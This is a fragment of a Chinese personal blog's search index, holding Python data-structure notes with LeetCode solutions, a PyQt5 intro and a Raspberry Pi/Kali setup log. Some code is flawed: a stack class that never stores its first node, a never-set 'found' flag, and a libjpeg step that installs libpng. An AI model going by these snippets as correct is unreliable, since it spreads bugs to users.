class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span>:<span class="comment"># 双链表</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value, prev = <span class="literal">None</span>, <span class="built_in">next</span> = <span class="literal">None</span></span>):</span><br><span class="line">        self.value = value</span><br><span class="line">        self.prev = prev</span><br><span class="line">        self.<span class="built_in">next</span> = <span class="built_in">next</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Stack</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.tail = <span class="literal">None</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enquen</span>(<span class="params">self, value</span>):</span><br><span class="line">        node = Node(value)</span><br><span class="line">        node.prev = self.tail</span><br><span class="line">        <span class="keyword">if</span> self.tail:</span><br><span class="line">            self.tail.<span class="built_in">next</span> = node</span><br><span class="line">            self.tail = node</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dequen</span>(<span class="params">self</span>):</span><br><span class="line">        self.tail = self.tail.prev</span><br><span class="line">        <span class="keyword">if</span> self.tail:</span><br><span class="line">        self.tail.<span class="built_in">next</span> = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isEmpty</span>(<span class="params">self</span>):</span><br><span class="line">        self.tail == <span class="literal">None</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Coding </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从零开始的Python ACM Ch.1：数据类型及基本数据处理</title>
      <link href="/posts/Go-for-Python-Ch1/"/>
      <url>/posts/Go-for-Python-Ch1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h2><h3 id="可迭代数据类型"><a href="#可迭代数据类型" class="headerlink" title="可迭代数据类型"></a>可迭代数据类型</h3><p>通用操作： </p><ul><li>遍历</li><li>max</li><li>min</li><li>sum</li><li>len</li><li>成员测试 in、not in</li></ul><h3 id="序列数据类型"><a href="#序列数据类型" class="headerlink" title="序列数据类型"></a>序列数据类型</h3><p>通用操作： </p><ul><li>索引 </li><li>切片 </li><li>index </li><li>count </li><li>同类型加法拼接 </li><li>整数乘法重复</li></ul><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><p>不可变数据类型（对字符串的所有修改操作，都是返回一个新的字符串）</p><p>特有操作：</p><ul><li><code>s.upper() </code></li><li><code>s.lower() </code></li><li><code>s.replace(sub1, sub2) </code></li><li><code>s.join(Iterable[str]) </code></li><li><code>s.format() </code></li><li><code>s.split(c)</code></li></ul><h4 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h4><p>不可变数据类型，基本是拿来用索引，或者切片</p><h4 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h4><p>可变数据类型</p><p>特有操作： </p><ul><li><p>通过索引进行修改 </p></li><li><p>通过切片进行修改 </p></li><li><p><code>ls.append(x) </code></p></li><li><p>del ls[i] i为元素索引 </p></li><li><p><code>ls.remove(x)</code> x为元素值 </p></li><li><p><code>ls.extend(lt2) </code></p></li><li><p><code>ls.insert(i, x) </code></p></li><li><p><code>ls.reverse() </code></p></li><li><p><code>ls.clear()</code></p></li><li><p>列表表达式</p></li></ul><h4 id="集合-amp-字典"><a href="#集合-amp-字典" class="headerlink" title="集合 &amp; 字典"></a>集合 &amp; 字典</h4><p>集合中的元素、字典的键 都必须为不可变数据类型，不能重复 </p><p>如果直接对字典进行<code>for</code>循环的遍历，那么出来的是字典的键</p><p>集合的特有方法：</p><ul><li><code>s.pop()</code> 弹出集合s中的一个元素 </li><li><code>s.add(x)</code> 将x添加到集合s中 </li><li><code>s.remove(x)</code> 删除集合s中的元素x，x不存在则出错 </li><li><code>s.discard(x)</code> 删除集合s中的元素x，x不存在不出错 </li><li><code>s.update(t)</code> 将集合t合并到集合s中 </li><li><code>s.clear()</code> 清空集合s </li><li><code>s-t</code> 差集 </li><li><code>s&amp;t</code> 交集 </li><li><code>s|t</code> 并集 </li><li><code>s^t</code> 并集减去交集 </li><li><code>s.isdisjoint(t)</code> 判断是否相交 比较操作 判断包含关系</li></ul><p>字典的特有方法： </p><ul><li><p>通过键进行索引 </p></li><li><p><code>d.keys()</code> 所有键的迭代器 </p></li><li><p><code>d.values()</code> 所有值的迭代器 </p></li><li><p><code>d.items()</code> 所有键值对的迭代器 </p></li><li><p><code>d.get(key, default)</code> 如果key存在，返回d[key]，否则返回default </p></li><li><p><code>d.pop(key, default)</code> 返回 <code>d.get(key, default)</code> 并不出错的删除key </p></li><li><p><code>d.popitem() </code></p></li><li><p><code>d.update(d2)</code></p></li></ul><h2 id="列表表达式"><a href="#列表表达式" class="headerlink" title="列表表达式"></a>列表表达式</h2><p>一般我们使用的列表长这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls = [<span class="number">123</span>,<span class="number">456</span>,<span class="number">789</span>,<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>但是Python里面有个东西叫做列表表达式，例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls1 = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>)]</span><br></pre></td></tr></table></figure><p>这会生成一个带有0-99的<code>int</code>数据类型的列表，非常简洁</p><h2 id="列表的排序"><a href="#列表的排序" class="headerlink" title="列表的排序"></a>列表的排序</h2><p>一般来说，你自己在Python里面写的对列表进行排序的函数，都不如内置的<code>list().sort(*, key=key, reverse=False)</code>要快，谁让人家是C语言写的排序呢……</p><p>但是<code>list().sort()</code>有个坑，我前两天帮人数学建模的时候还是踩进了这个坑，就是：这个方法是直接作用于列表本身，没有返回值的，所以进行赋值的时候就会变成<code>none</code></p><h3 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h3><p>下面的列表<code>a</code>是人物的名字，<code>b</code>是他们对应的年龄，请输出18岁以下的人物并根据他们的年龄进行升序排列</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="string">&#x27;tom&#x27;</span>, <span class="string">&#x27;iron man&#x27;</span>,<span class="string">&#x27;jerry&#x27;</span>, <span class="string">&#x27;donald&#x27;</span>, <span class="string">&#x27;micky&#x27;</span>, <span class="string">&#x27;spider man&#x27;</span>]</span><br><span class="line">b = [<span class="number">3</span>, <span class="number">32</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">19</span>]</span><br></pre></td></tr></table></figure><p>我的做法是用多一个列表，往里面用元组的形式填他们的名字以及年龄信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ls = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    pos = a.index(i)</span><br><span class="line">    age = b[pos]</span><br><span class="line">    <span class="keyword">if</span> age &lt; <span class="number">18</span>:</span><br><span class="line">        ls.append((i,age))</span><br></pre></td></tr></table></figure><p>对<code>ls</code>进行打印，得出这样的一个列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[(<span class="string">&#x27;tom&#x27;</span>, <span class="number">3</span>), (<span class="string">&#x27;jerry&#x27;</span>, <span class="number">1</span>), (<span class="string">&#x27;donald&#x27;</span>, <span class="number">8</span>), (<span class="string">&#x27;micky&#x27;</span>, <span class="number">2</span>)]</span><br></pre></td></tr></table></figure><p>再通过<code>sort</code>函数和<code>lambda</code>表达式进行排序，对所需要的东西进行打印</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ls:</span><br><span class="line">    <span class="built_in">print</span>(i[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>输出为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jerry</span><br><span class="line">micky</span><br><span class="line">tom</span><br><span class="line">donald</span><br></pre></td></tr></table></figure><p>但是经过教员的提醒，还有个<code>zip()</code>函数可以直接把两个列表中的对应位置的元素合在一起变成元组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">items = <span class="built_in">list</span>(<span class="built_in">zip</span>(a,b))</span><br></pre></td></tr></table></figure><p>这样做的结果跟上面的<code>ls</code>的结果是一样的</p><p>然后再在列表表达式里面筛选，两步可以合在一起</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">items = [item <span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">list</span>(<span class="built_in">zip</span>(a,b)) <span class="keyword">if</span> item[<span class="number">1</span>] &lt; <span class="number">18</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> items:</span><br><span class="line">    <span class="built_in">print</span>(i[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p><strong>启示：少用字典，筛选放在后面去</strong></p><h3 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h3><p><a href="https://leetcode.cn/problems/find-target-indices-after-sorting-array/">2089. 找出数组排序后的目标下标 - 力扣（LeetCode）</a></p><p>我的题解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">targetIndices</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], target: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        nums.sort()</span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(nums)):</span><br><span class="line">            <span class="keyword">if</span> nums[i] == target:</span><br><span class="line">                result.append(i)</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>优化版（因为找到了以后，再往后就不存在要找的了，所以可以直接<code>break</code>掉）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">targetIndices</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], target: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        nums.sort()</span><br><span class="line">        result = []</span><br><span class="line">        found = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(nums)):</span><br><span class="line">            <span class="keyword">if</span> nums[i] == target:</span><br><span class="line">                result.append(i)</span><br><span class="line">            <span class="keyword">if</span> nums[i] != target <span class="keyword">and</span> found:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><h3 id="例题3"><a href="#例题3" class="headerlink" title="例题3"></a>例题3</h3><p><a href="https://leetcode.cn/problems/find-the-difference-of-two-arrays/submissions/">2215. 找出两数组的不同 - 力扣（LeetCode）</a></p><p>我的题解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findDifference</span>(<span class="params">self, nums1: <span class="type">List</span>[<span class="built_in">int</span>], nums2: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        answer = [[],[]]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums1:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> nums2 <span class="keyword">and</span> i <span class="keyword">not</span> <span class="keyword">in</span> answer[<span class="number">0</span>]:</span><br><span class="line">                answer[<span class="number">0</span>].append(i)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums2:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> nums1 <span class="keyword">and</span> i <span class="keyword">not</span> <span class="keyword">in</span> answer[<span class="number">1</span>]:</span><br><span class="line">                answer[<span class="number">1</span>].append(i)</span><br><span class="line">        <span class="keyword">return</span> answer</span><br></pre></td></tr></table></figure><p>优化版（找不同的可以用集合去做）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findDifference</span>(<span class="params">self, nums1: <span class="type">List</span>[<span class="built_in">int</span>], nums2: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        s1 = <span class="built_in">set</span>(nums1)</span><br><span class="line">        s2 = <span class="built_in">set</span>(nums2)</span><br><span class="line">        answer = [[],[]]</span><br><span class="line">        answer[<span class="number">0</span>] = <span class="built_in">list</span>(s1-s2)</span><br><span class="line">        answer[<span class="number">1</span>] = <span class="built_in">list</span>(s2-s1)</span><br><span class="line">        <span class="keyword">return</span> answer</span><br></pre></td></tr></table></figure><h3 id="例题4"><a href="#例题4" class="headerlink" title="例题4"></a>例题4</h3><p><a href="https://leetcode.cn/problems/minimum-index-sum-of-two-lists/submissions/">599. 两个列表的最小索引总和 - 力扣（LeetCode）</a></p><p>我的题解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findRestaurant</span>(<span class="params">self, list1: <span class="type">List</span>[<span class="built_in">str</span>], list2: <span class="type">List</span>[<span class="built_in">str</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">        lovedRest = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> list2:</span><br><span class="line">                indexSum = list1.index(i) + list2.index(i)</span><br><span class="line">                lovedRest.append((i,indexSum))</span><br><span class="line">        lovedRest.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line">        result = []</span><br><span class="line">        result.append(lovedRest[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(lovedRest)):</span><br><span class="line">            <span class="keyword">if</span> lovedRest[i][<span class="number">1</span>] == lovedRest[<span class="number">0</span>][<span class="number">1</span>]: result.append(lovedRest[i][<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">else</span>: <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p><code>enumerate(list)</code>在遍历的过程中出现<code>index, value</code>的返回值，可以在for循环使用，例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...(上面已经定义了ls为列表)</span><br><span class="line"><span class="keyword">for</span> i, value <span class="keyword">in</span> <span class="built_in">enumerate</span>(ls):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>所以上面这一题也可以改一改，用这个方法可以免去用<code>ls.index()</code>的麻烦</p><h3 id="例题5"><a href="#例题5" class="headerlink" title="例题5"></a>例题5</h3><p><a href="https://leetcode.cn/problems/find-all-k-distant-indices-in-an-array/submissions/">2200. 找出数组中的所有 K 近邻下标 - 力扣（LeetCode）</a></p><p>我的题解（<code>OT</code>了）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">abs</span>(<span class="params">num</span>):</span><br><span class="line">        <span class="keyword">if</span> num &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> num*-<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>: <span class="keyword">return</span> num</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findKDistantIndices</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], key: <span class="built_in">int</span>, k: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        keyPos = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(nums)) <span class="keyword">if</span> nums[i] == key]</span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> keyPos:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(nums)):</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">abs</span>(i-pos)&lt;=k <span class="keyword">and</span> i <span class="keyword">not</span> <span class="keyword">in</span> result: result.append(i) </span><br><span class="line">                <span class="keyword">else</span>: <span class="keyword">pass</span></span><br><span class="line">        result.sort()</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>优化版：</p><p>思路是从<code>i</code>所在位置往左往右<code>k</code>个位置是否有key，如果有的话就进行计算，没有就跳过，省去了很多遍历</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findKDistantIndices</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], key: <span class="built_in">int</span>, k: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">            <span class="keyword">if</span> key <span class="keyword">in</span> nums[<span class="built_in">max</span>(<span class="number">0</span>,i-k):i+k+<span class="number">1</span>]:</span><br><span class="line">                result.append(i)</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><h2 id="列表的空间"><a href="#列表的空间" class="headerlink" title="列表的空间"></a>列表的空间</h2><p>列表在内存中是连续的，但是如果要用申请的空间之外的地方的话（即加长列表）就要再次申请，会减慢运行，所以可以先申请一大片空间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls = [<span class="number">0</span>]*<span class="number">1000</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Coding </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Python和Qt5来制作带有GUI的程序（持续更新）</title>
      <link href="/posts/Making-GUI-with-PyQt5/"/>
      <url>/posts/Making-GUI-with-PyQt5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>我还是向我不熟悉的领域发起了挑战——制作GUI</p><p>印象中我做GUI只有在<a href="http://app.gzjkw.net/">MIT App Inventor (gzjkw.net)</a>和<code>Visual Basics</code>里面做过（下图为以前拿去参赛的作品，获得了省三），而且VB很久都没用过了</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets/img/Making-GUI-with-PyQt5/msedge-20221006-151746.png"></p><p>这回主要是创新项目的需要，要做一个带有GUI的附属程序，所以我研究起了怎么做GUI</p><p>我用的是比较知名的Qt5这个东西（本来还尝试过<code>dearpygui</code> <code>Tkinker</code> <code>pygame</code>之类的，但是因为感觉太繁琐了就不用了）</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Raspberry 4B 折腾记录（持续更新）</title>
      <link href="/posts/Raspberry-4B-Log/"/>
      <url>/posts/Raspberry-4B-Log/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="烧录系统"><a href="#烧录系统" class="headerlink" title="烧录系统"></a>烧录系统</h3><p>我用的是<code>balenaEtcher</code>这个软件（别问为什么，问就是好看），比起Win32DiskImager和Rufus来说更好用一点（个人感觉）</p><p>（↓没插读卡器所以用磁盘代替一下，千万别写入磁盘！）</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/Raspberry-4B-Log/balenaEtcher-20221005-225233.png"></p><h3 id="对ext4格式的存储介质进行写入"><a href="#对ext4格式的存储介质进行写入" class="headerlink" title="对ext4格式的存储介质进行写入"></a>对ext4格式的存储介质进行写入</h3><p>我用的是DiskGenius，但是不知道为什么在我的电脑上打开会提示这个……</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/Raspberry-4B-Log/ntleah-20221005-151900.png"></p><p><code>Err: NTLEAS may be lost connection with hook process.</code></p><p>我这个用的是<code>5.1.1</code>的中文专业版（免费版不能对ext4格式进行写入），因为打不开所以我去换了个版本。</p><p>从网上下了个<code>5.2.0.884</code>就好了，就，很奇怪，估计是这个版本的问题。</p><h3 id="重装Kali-Linux后在无屏幕的条件下自动连接WIFI（未解决）"><a href="#重装Kali-Linux后在无屏幕的条件下自动连接WIFI（未解决）" class="headerlink" title="重装Kali Linux后在无屏幕的条件下自动连接WIFI（未解决）"></a>重装Kali Linux后在无屏幕的条件下自动连接WIFI（未解决）</h3><p>这个我在网上找了很多方法，但是我发现很多他们都是用的树莓派自己的Debian衍生系统，用的不是Kali，这个方法用在Kali上等于无效……</p><p>直到我发现了这几个</p><p><a href="https://blog.csdn.net/yayale01/article/details/107132570">树莓派 kali Linux 开机自动连接WiFi （bash 脚本）_yayaleII的博客-CSDN博客_kali自动连接wifi</a></p><p><a href="https://blog.csdn.net/CTQ54250/article/details/108433590">kali（64位）在树莓派4B的安装配置_CTQ54250的博客-CSDN博客</a></p><p>我尝试了一下，但是说白了，还是没解决……</p><h3 id="使用屏幕键盘"><a href="#使用屏幕键盘" class="headerlink" title="使用屏幕键盘"></a>使用屏幕键盘</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install matchbox-keyboard</span><br></pre></td></tr></table></figure><p>在Raspberry Pi上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">matchbox-keyboard</span><br></pre></td></tr></table></figure><p>通过SSH</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DISPLAY=:0 matchbox-keyboard &amp;</span><br></pre></td></tr></table></figure><p>该命令将加载Raspberry Pi上的屏幕键盘软件。</p><h3 id="在树莓派上安装RDP服务"><a href="#在树莓派上安装RDP服务" class="headerlink" title="在树莓派上安装RDP服务"></a>在树莓派上安装RDP服务</h3><p>使用<a href="https://github.com/Har-Kuun/OneClickDesktop">Har-Kuun&#x2F;OneClickDesktop: A one-click script that installs a remote desktop environment on a Linux server with browser&#x2F;RDP&#x2F;VNC access. (github.com)</a></p><p>直接运行，但是在shell脚本里面需要把OS检查关掉（如果你像我一样用的是Kali）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">此脚本仅支持Ubuntu 18/20, Debian 10, 以及CentOS 7/8.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果您试图再其他版本的操作系统中安装，可以在下面禁用OS检查开关。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">请注意，在其他操作系统上安装此脚本可能会导致不可预料的错误。  请在安装前做好备份。</span></span><br><span class="line"></span><br><span class="line">OS_CHECK_ENABLED=OFF</span><br></pre></td></tr></table></figure><p>安装时可能会遇到依赖环境未安装的情况，直接用apt安装就行了</p><h4 id="libpng"><a href="#libpng" class="headerlink" title="libpng"></a>libpng</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libpng-dev -y</span><br></pre></td></tr></table></figure><h4 id="libjpeg"><a href="#libjpeg" class="headerlink" title="libjpeg"></a>libjpeg</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libpng-dev -y</span><br></pre></td></tr></table></figure><h4 id="Cairo"><a href="#Cairo" class="headerlink" title="Cairo"></a>Cairo</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libcairo2 libcairo2-dev -y</span><br></pre></td></tr></table></figure><h4 id="OSSP-UUID"><a href="#OSSP-UUID" class="headerlink" title="OSSP UUID"></a>OSSP UUID</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libossp-uuid-dev -y</span><br></pre></td></tr></table></figure><h4 id="无法编译"><a href="#无法编译" class="headerlink" title="无法编译"></a>无法编译</h4><p>因为OpenSSL升级到<code>3.0.0</code>然后不支持，所以直接降级回去就行了</p><p>默认是<code>OpenSSL 1.1.1m</code>，所以建议先编译完再升级（没事别<code>sudo apt upgrade -y</code>）</p><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/Raspberry-4B-Log/Xshell-20221201-223944.png"></p>]]></content>
      
      
      <categories>
          
          <category> IoT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IoT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
